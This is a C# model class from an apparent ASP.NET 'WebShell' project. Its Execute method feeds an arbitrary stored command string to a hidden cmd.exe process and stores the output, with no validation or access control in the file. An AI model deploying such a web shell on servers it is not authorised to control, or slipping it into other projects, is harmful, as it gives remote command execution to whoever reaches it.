using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;

namespace WebShell.Models
{
    public class CommandModel
    {
        [Key]
        public int? Id { get; set; }
        public DateTime? Time { get; set; } = DateTime.Now;
        public string? Source { get; set; }
        public string? Result { get; set; }

        public void Execute()
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.RedirectStandardError = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();


            cmd.StandardInput.WriteLine(Source);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            
            var Error = cmd.StandardError.ReadToEnd();
            if (Error.Length != 0)
            {
                Result = Error;
            }
            else
            {
                List<string> Output = new List<string>();
                string Buf;

                while ((Buf = cmd.StandardOutput.ReadLine()) != null)
                {
                    Output.Add(Buf);
                }

                Result = String.Join(" ", Output.GetRange(4, Output.Count - 5));
            }
        }
    }
}
